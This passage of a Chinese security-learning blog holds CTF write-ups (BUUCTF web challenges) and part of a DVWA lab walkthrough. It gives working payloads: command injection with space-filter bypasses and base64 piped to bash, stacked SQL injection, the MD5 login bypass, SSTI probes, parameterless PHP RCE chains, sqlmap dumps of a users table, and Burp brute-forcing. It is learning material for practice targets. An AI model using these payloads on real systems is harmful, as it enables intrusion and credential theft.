1（命令注入）</h2><p>发现一个规律，这些题目都挺喜欢把flag放在php文件里并注释掉，这样就可以不让flag输出在网页上，而我们通常的思路都是要读源码就能找到这玩意，并且题目给的任何提示都是有用的比如这边的?ip&#x3D;就是叫我们用这个当做变量上传参数，以及后来的绕过啊什么的都有提示，并且这里又是linux的操作系统</p><p><strong>绕过空格的方法：</strong></p><pre class="line-numbers language-none"><code class="language-none">$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X&#x3D;$&#39;cat\x09.&#x2F;flag.php&#39;;$X       （\x09表示tab，也可以用\x20）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还涉及到一些知识比如这里的<strong>base64绕过</strong>命令：<code>?ip=127.0.0.1;echo$IFS$1&quot;Y2F0IGZsYWcucGhw&quot;|$IFS$1base64$IFS$1-d$IFS$1|$IFS$1bash</code>给出<a href="https://www.cnblogs.com/JasonCeng/p/15741335.html">文章</a>解释<br>还有这题大多数的解法变量绕过：<code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code><br>并且还有不出现flag的方法绕过：?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code> <strong>使用 $IFS$9绕过空格，配合「反引号」的高优先级特性查看 flag.php 文件(将ls的结果当成cat的参数，那样就不用出现flag这个参数了)</strong> 这个ls是有带反引号的因为Markdown语法被识别成了代码<br><a href="https://blog.csdn.net/vanarrow/article/details/108295481">解题参考1</a><br><a href="https://www.cnblogs.com/LY613313/p/16186012.html">解题参考2</a><br>感谢老师傅的解答</p><h2 id="0x04-强网杯-2019-随便注-1（堆叠注入）"><a href="#0x04-强网杯-2019-随便注-1（堆叠注入）" class="headerlink" title="0x04 [强网杯 2019]随便注 1（堆叠注入）"></a>0x04 [强网杯 2019]随便注 1（堆叠注入）</h2><hr><p>ps：不是我就在想啊靶场是什么玩意啊<img src="/images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/3.jpg">，实战题都是什么牛马啊<img src="/images/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/4.png">，我不理解并且大为震撼怎么会有这么多的注入姿势啊？？？<br>直接给出参考<a href="https://zhuanlan.zhihu.com/p/545713669">链接</a>这个最全了<br>四个方法：<br>1、预编译拼接法<br>2、预编译进制法<br>3、更改表名法<br>4、handle特殊法<br>解释都在链接里了</p><h2 id="0x05-SUCTF-2019-EasySQL-1（堆叠注入）"><a href="#0x05-SUCTF-2019-EasySQL-1（堆叠注入）" class="headerlink" title="0x05 [SUCTF 2019]EasySQL 1（堆叠注入）"></a>0x05 [SUCTF 2019]EasySQL 1（堆叠注入）</h2><hr><p>每个小白看完wp都会觉得离谱的猜测代码做法，代码拼接后的逻辑我理解，这里主要记录下这种注入语句：<code>select *,1||flag from Flag</code>,还有第二种堆叠注入的方法要设置参数，也记录一下</p><pre class="line-numbers language-none"><code class="language-none">sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>拼接完相当于select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag<br>具体做法看这篇<a href="https://blog.csdn.net/bring_coco/article/details/108737434">博客</a></p><h2 id="0x06-BJDCTF2020-Easy-MD5-1"><a href="#0x06-BJDCTF2020-Easy-MD5-1" class="headerlink" title="0x06 [BJDCTF2020]Easy MD5 1"></a>0x06 [BJDCTF2020]Easy MD5 1</h2><hr><p>ps：对于这题主要记录php中的MD5函数如何绕过判断，以及这个比较骚的<code>select * from ‘admin’ where password =md5($pass,ture)</code>绕过</p><hr><p><code>select * from ‘admin’ where password =md5($pass,ture)</code>构造password&#x3D;’ ‘or’数字’就可以得到<code>select * from ‘admin’ where password =‘ ’or永真</code>实现绕过，<strong>记录MD5字符串：ffifdyop</strong>，加密后会变成’or’6XXXXXXXXX 正好<br>对于弱比较：md5(a)&#x3D;&#x3D;md5(b)或强比较md5(a)&#x3D;&#x3D;&#x3D;md5(b)绕过判断，<strong>可以根据md5函数对数组不可加密来绕过</strong>，构造$a:a[]&#x3D;1和$b:b[]&#x3D;2都会返回null，即null&#x3D;null就可以了，对于弱比较还可以通过<strong>科学计数法来绕过，0eXXXX&#x3D;0eXX</strong>，即0的几次方都等于0，<strong>强比较好像不行</strong>，给出两个加密后会等于这个格式的字符串<strong>QNKCDZO</strong>和<strong>s878926199a</strong><br><a href="https://blog.csdn.net/xhy18634297976/article/details/122747034">参考链接1</a><br><a href="https://www.cnblogs.com/junlebao/p/13820591.html">参考链接2</a></p><h2 id="0x07-护网杯-2018-easy-tornado-1（模板注入）"><a href="#0x07-护网杯-2018-easy-tornado-1（模板注入）" class="headerlink" title="0x07 [护网杯 2018]easy_tornado 1（模板注入）"></a>0x07 [护网杯 2018]easy_tornado 1（模板注入）</h2><hr><ul><li>ps：对于这题需要的前置知识比较多涉及到web的tornado框架的理解，老实说这题做的意义在搜资料了，没了解根本做不出来，网上的wp也写的不清不楚关健的地方一笔带过，感觉payload的构造真的要有这方面经验才懂，然后模模糊糊了解了下模板注入TTSI，就没然后了，哎重在学吧。</li></ul><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言。</p><p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p><p>在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>&#123;$what&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Welcome, &#123;&#123;username&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>&#123;%$a%&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">通过注入了探测字符串 $&#123;&#123;123+456&#125;&#125;，以查看应用程序是否进行了相应的计算,如果返回了579那么则存在TTSI，这符合它们对于 &#123;&#123; &#125;&#125; 的处理方式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">TTSI参考文章</a></p><hr><p>尝试了error?msg&#x3D;1，发现的确存在模块注入，然后其他什么<code>+-*/</code>好像都会报错，这里出来个payload：<code>?msg&#123;handler.settings&#125;</code><strong>tornado在搭建一个网站时，肯定会有多个handler，而这些handler都是RequestHandler的子类，RequestHandler.settings又指向self.application.settings。所以我们可以说handler.settings指向了RequestHandler.settings了</strong>，其实和没讲一样，它只是和你说了有这玩意而已，还是不理解。这里涉及到一个filehash，filehash要和文件匹配才能访问文件，是一种保护机制就像是文件的密码。本题告诉你flag名，关健就是求他的filehash值，它也告诉你了filehash的计算公式，剩下的就是找。<br><a href="https://www.cnblogs.com/junlebao/p/13819357.html">参考链接1</a><br><a href="https://www.cnblogs.com/upfine/p/16580848.html">参考链接2</a></p><h2 id="0x08-BJDCTF2020-ZJCTF，不过如此-1（正则匹配）"><a href="#0x08-BJDCTF2020-ZJCTF，不过如此-1（正则匹配）" class="headerlink" title="0x08 [BJDCTF2020]ZJCTF，不过如此 1（正则匹配）"></a>0x08 [BJDCTF2020]ZJCTF，不过如此 1（正则匹配）</h2><hr><p>preg_replace()的&#x2F;e模式存在命令执行漏洞，第二个参数将被当作代码执行。<br><a href="https://blog.csdn.net/RABCDXB/article/details/115363699">做题参考</a><br><a href="https://xz.aliyun.com/t/2557">大哥补充</a></p><h2 id="0x09-GXYCTF2019-禁止套娃-1（rce漏洞）"><a href="#0x09-GXYCTF2019-禁止套娃-1（rce漏洞）" class="headerlink" title="0x09 [GXYCTF2019]禁止套娃 1（rce漏洞）"></a>0x09 [GXYCTF2019]禁止套娃 1（rce漏洞）</h2><hr><p><code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]))</code>这个式子他会递归调用当前的正则表达式。也就是说会出现\w+((?R)?)，\w+(\w+((?R)?))的情况，假设传入<code>a(b());</code>最后会被替换成<code>；</code>只要构造的函数满足这个形式就可以了，<strong>像var_dump(scandir(‘.’))；，会被替换成.;不满足要求</strong>，这种带?R的是典型的无参数函数效验</p><pre class="line-numbers language-none"><code class="language-none">payload:print_r(array_rand(array_flip(scandir(current(localeconv())))));array_rand()函数可以随机读取一个数组键，array_flip()又可以将数组中的键和值进行对换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">getchwd() 函数返回当前工作目录。scandir() 函数返回指定目录中的文件和目录的数组。dirname() 函数返回路径中的目录部分。chdir() 函数改变当前的目录。readfile() 输出一个文件。current() 返回数组中的当前单元, 默认取第一个值。pos() current() 的别名。next() 函数将内部指针指向数组中的下一个元素，并输出。end() 将内部指针指向数组中的最后一个元素，并输出。array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回。array_reverse() 函数返回翻转顺序的数组。chr() 函数从指定的 ASCII 值返回字符。hex2bin() — 转换十六进制字符串为二进制字符串。getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。localeconv() 函数返回一包含本地数字及货币格式信息的数组。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">无参数RCE总结</a></p><h2 id="0x0A-WUSTCTF2020-朴实无华-1"><a href="#0x0A-WUSTCTF2020-朴实无华-1" class="headerlink" title="0x0A [WUSTCTF2020]朴实无华 1"></a>0x0A [WUSTCTF2020]朴实无华 1</h2><hr><p>在没有有效信息时：</p><ul><li>1、查看源码</li><li>2、抓包看头部信息</li><li>3、考虑git泄露</li><li>4、扫描</li><li>5、考虑模板注入</li></ul><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2020</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"wctf2020"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一次绕过:<strong>intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型（只适用php7.0以下的版本）</strong>,假如num&#x3D;1e10，$num &#x3D; $_GET[‘num’];传入这边时是字符串，所以intval($num) &#x3D;&#x3D; 1;intval($num + 1);这边时虽然传入的还是字符串但和一相加时会转化为int类型1410065409;</p><p>第二次绕过md5&#x3D;0e215962017加密后还是以0e开头</p><p>第三次绕过cat可以用tac替换，空格用$IFS$9替换<br><a href="https://blog.csdn.net/shinygod/article/details/123617666">参考链接1</a><br><a href="https://blog.csdn.net/m0_62879498/article/details/124632041">参考链接2</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web做题记录 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 命令注入 </tag>
            
            <tag> 模板注入 </tag>
            
            <tag> 正则匹配 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA部分解析</title>
      <link href="/2023/07/06/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/07/06/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA靶场解析"><a href="#DVWA靶场解析" class="headerlink" title="DVWA靶场解析"></a>DVWA靶场解析</h1><hr><p>ps：有好长一段时间没有学web了，一个月都在准备各种考试 QAQ，这几天花了点时间把kali虚拟机搭了一下，顺带着说dvwa靶场我是在kali里刷的，搭这个玩意着实麻烦……，但好处是不用再下工具了，kali就是为web渗透而生！<del>（一个苦逼花了快一天时间整完后的遗言）</del></p><h2 id="0x01-SQL-Injection"><a href="#0x01-SQL-Injection" class="headerlink" title="0x01 SQL Injection"></a>0x01 SQL Injection</h2><hr><h3 id="sqlmap工具注入"><a href="#sqlmap工具注入" class="headerlink" title="sqlmap工具注入"></a>sqlmap工具注入</h3><hr><h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><p>由于是sql注入这里就不展示太多的sql关卡的打法，这里记录的是新工具的用法<strong>sqlmap</strong><del>（能自动何必手动）</del><br>这里附上<a href="https://blog.csdn.net/qq_37964989/article/details/84109094">链接</a>总结了sqlmap的一些常见命令。<br>以及打通这个关卡的<a href="https://www.bilibili.com/video/BV11W41157j3/?spm_id_from=333.337.search-card.all.click&vd_source=6b56c0a6f7c42ccbc63f5ce49fb71500">视频1</a>，<a href="https://www.bilibili.com/video/BV1YA411R7pK/?spm_id_from=333.337.search-card.all.click&vd_source=6b56c0a6f7c42ccbc63f5ce49fb71500">视频2</a>更好理解<br>开始我们输入sqlmap后进入交互状态，然后先在low状态下的sql关卡输入1并抓包获取cookie<br>输入命令<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/1.png"><br>可以看到我们爆出了注入点<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --dbs --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/2.png"><br>列出库名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; --current-db --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/3.png"><br>列出当前库名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa --tables --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/4.png"><br>列出表名<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa T users --columns --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/5.png"><br>列出users表的字段信息<br><code>sqlmap -u &quot;192.168.201.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot; security=low; PHPSESSID=uitdooscaev668qng96hju3vh8&quot; -D dvwa T users C users,password,user_id --dump --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/6.png"><br>打印你想要的信息并自动解密还会自动保存到本地上(倒数第二行告诉我们它的存储地址）直接复制去找就行，结果如下：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/7.png"></p><h4 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h4><p>这里我们没有输入框，但是我们可以通过把命令数据放进数据包来执行命令，下面举出一个例子：<br><code>sqlmap -r  /root/1.txt -D dvwa --tables --batch</code><br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/8.png"><br>这里我们只要抓包然后将抓包后的所有内容复制到新的文本文件1.txt并告诉系统它的绝对路径，（如果和sqlmap相同路径就不用绝对路径了），这里我放在了root根目录下，可以看出直接用抓包数据还是很方便的，其他的一样。同时这里也有遇到一个问题<strong>如果你也出现了[07:53:47] [CRITICAL] specified file ‘&#x2F;root&#x2F;1.txt’ does not contain a usable HTTP request (with parameters)这个报错，<del>那么这件事是在是太酷啦</del>，目前测出来是1.txt文本要重新创建就可以成功避开，不知道什么原理</strong></p><h4 id="High"><a href="#High" class="headerlink" title="High"></a>High</h4><p>这里碰到一个报错，实在不知道什么原因暂时就不发了，报错发一下[CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for ‘–level’&#x2F;‘–risk’ options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option ‘–tamper’ (e.g. ‘–tamper&#x3D;space2comment’) and&#x2F;or switch ‘–random-agent’<br>如果有有心人看到能告诉我就更好了……</p><h2 id="0x02-Brute-Force"><a href="#0x02-Brute-Force" class="headerlink" title="0x02 Brute Force"></a>0x02 Brute Force</h2><hr><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p>任意输入用户名和密码并抓包<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/9.png"><br>将结果右击送入intruder，先右击clean清除变量<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/10.png"><br>再add我们要爆破的变量，这里我们选定password<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/11.png"><br>payload选simple list，并导入自己网上下的字典，开始攻击<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/12.png"><br>当看到出现不一样长度的length就代表成功了，此密码可以登入<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/13.png"></p><h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p>和Low差不多只是在代码上加上了转义，一定程度上防御了sql注入</p><h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p>ps：这题巨麻烦要设置好多东西而且顺序还不能反</p><ul><li>Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。<br>随便输入并先抓包，送给intruder，Attack type设置Pitchfork并把password和token设为爆破变量<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/14.png"><br>跳转到seting，找到Grep-Extract模块点击add进入下面界面，这里先点击fetch response后，这里有点难找可以在上面先输入value&#x3D;’然后双击那个token<strong>（记得复制！！！）</strong>，点击OK<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/15.png"><br>找到Redirections模块选Always<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/16.png"><br>回去设置payload第一个payload和上面Low一样，而后设置第二个如下，刚刚的token复制在框里：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/17.png"><br>然后开始攻击，但是你可能会出现这个报错：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/18.png"><br>这是因为我们没有设置线程的模块了，burp suite版本太新，给出解决<a href="https://blog.csdn.net/Minorko/article/details/126018180">办法</a><br>最后开始攻击：<br><img src="/images/DVWA%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90/19.png"><br>可以看到在render里我们成功爆破进入</li></ul><h2 id="0x03-Command-Injection"><a href="#0x03-Command-Injection" class="headerlink" title="0x03 Command Injection"></a>0x03 Command Injection</h2><hr><p>Command Injection，即命令注入攻击，是指由于嵌入式应用程序或者web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。在命令注入的漏洞中，最为常见的是PHP的命令注入。PHP命令注入攻击存在的主要原因是web应用程序员在应用PHP语言中一些具有命令执行功能的函数时，对用户提交的数据内容没有进行严格的过滤就带入函数中执行而造成的。例如，当黑客提交的数据内容为向网站目录写入PHP文件时，就可以通过该命令注入攻击漏洞写入一个PHP后门文件，进而实施进一步的渗透攻击。</p><p><strong>原理</strong>：Web应用在调用这些函数执行系统命令的时候，在没有做好过滤用户输入的情况下，如果用户将自己的输入作为系统命令的参数拼接到命令行中，就会造成命令注入的漏洞。<br><strong>命令注入的形成需要如下三个条件：</strong></p><ul><li><p>1、使用了内部调用shell的函数：system()，exec()等。</p></li><li><p>2、将外界传入的参数没有足够的过滤，直接传递给内部调用shell的函数。</p></li><li><p>3、参数中shell的元字符没有被转义。</p></li></ul><h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Get input</span>    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Determine OS and execute the ping command.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token 